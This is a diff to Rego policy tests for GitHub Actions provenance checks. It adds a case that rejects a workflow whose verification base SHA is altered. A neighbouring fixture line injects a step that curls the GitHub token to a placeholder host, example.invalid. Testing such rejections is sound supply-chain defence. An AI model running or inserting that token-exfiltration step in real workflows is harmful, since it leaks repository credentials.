@@ -598,6 +598,20 @@ test_rejects_native_receipt_provenance_with_changed_verifier_step if {
 	contains(msg, "must not use pull_request_target")
 }
 
+test_rejects_native_receipt_provenance_with_changed_verification_base if {
+	base := native_receipt_provenance_fixture
+	steps := [
+		base.jobs.verify.steps[0],
+		object.union(base.jobs.verify.steps[1], {"run": replace(base.jobs.verify.steps[1].run,
+			`verification_base_sha="$base_sha"`, `verification_base_sha="untrusted"`)}),
+	]
+	workflow := object.union(base, {"jobs": {"verify": object.union(base.jobs.verify, {"steps": steps})}})
+	violations := deny with input as workflow
+
+	some msg in violations
+	contains(msg, "must not use pull_request_target")
+}
+
 test_rejects_native_receipt_provenance_with_extra_step if {
 	base := native_receipt_provenance_fixture
 	steps := array.concat(base.jobs.verify.steps, [{"run": "curl --data '${{ github.token }}' https://example.invalid"}])
